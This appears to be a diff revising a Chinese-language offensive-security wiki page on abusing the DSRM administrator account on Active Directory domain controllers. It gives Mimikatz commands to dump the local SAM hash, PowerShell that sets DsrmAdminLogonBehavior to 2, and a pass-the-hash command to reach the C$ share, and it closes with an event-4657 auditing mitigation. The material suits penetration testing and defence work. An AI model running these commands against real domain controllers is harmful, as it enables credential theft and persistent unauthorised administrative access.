@@ -1,35 +1,40 @@
-# DSRM Credentials
+# DSRM 凭据
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## 基本信息
 
-每个 **DC** 中都有一个**本地管理员**账户。拥有此计算机上的管理员权限后，你可以使用 mimikatz **dump 本地 Administrator 的 hash**。然后修改注册表以**激活此密码**，这样你就可以远程访问此本地 Administrator 用户。\
-首先，我们需要在 DC 中 **dump** **本地 Administrator** 用户的 **hash**：
-```bash
+每个域控制器都有一个 Directory Services Restore Mode (DSRM) 管理员帐户。其密码在提升域控制器时设置，并且独立于 Active Directory 域帐户。<sup>[[1]](#references)</sup>
+
+拥有域控制器管理权限的攻击者可以转储本地 SAM 数据库，并恢复 DSRM Administrator NTLM hash。以下 Mimikatz 命令可执行此操作：<sup>[[2]](#references)</sup>
+```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-然后我们需要检查该账户是否可用；如果注册表项的值为 "0" 或不存在，则需要**将其设置为 "2"**：
-```bash
-Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
+默认情况下，DSRM account 用于 restore mode。将 `DsrmAdminLogonBehavior` 设置为 `2` 后，允许此 local account 在 domain controller 正常运行时进行 authentication。更改前请检查该值：<sup>[[2]](#references)[[3]](#references)</sup>
+```powershell
+$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue
+
+if ($null -eq $current) {
+New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
+} else {
+Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
+}
 ```
-然后，使用 PTH，你可以**列出 C$ 的内容，甚至获取一个 shell**。注意，要使用内存中的该 hash 创建新的 powershell session（用于 PTH），所使用的“domain”只是 DC machine 的名称：
-```bash
+恢复的哈希随后可用于 pass-the-hash 会话，以访问诸如管理共享 `C$` 之类的资源。对于此本地账户，请将域控制器的计算机名称用作 `/domain` 值：<sup>[[3]](#references)</sup>
+```powershell
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
-#And in new spawned powershell you now can access via NTLM the content of C$
+# In the new PowerShell process, access C$ over NTLM.
 ls \\dc-host-name\C$
 ```
-更多信息请参阅：[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 和 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>
+## Mitigation
 
-## 缓解措施
+- 审计对 `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` 的更改。当该项的 SACL 配置为审计 **Set Value** 操作时，安全事件 4657 会记录注册表值修改。<sup>[[4]](#references)</sup>
 
-- 事件 ID 4657 - 审计 `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` 的创建/更改
+## References
 
-## 参考资料
-
-- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
-- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)
-
+- [1] [Microsoft：重置 Directory Services Restore Mode 管理员密码](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
+- [2] [ADSecurity：隐蔽的 Active Directory 持久化 #11 —— Directory Service Restore Mode](https://adsecurity.org/?p=1714)
+- [3] [ADSecurity：隐蔽的 Active Directory 持久化 #13 —— DSRM 持久化 v2](https://adsecurity.org/?p=1785)
+- [4] [Microsoft：事件 4657 —— 注册表值已修改](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
 {{#include ../../banners/hacktricks-training.md}}
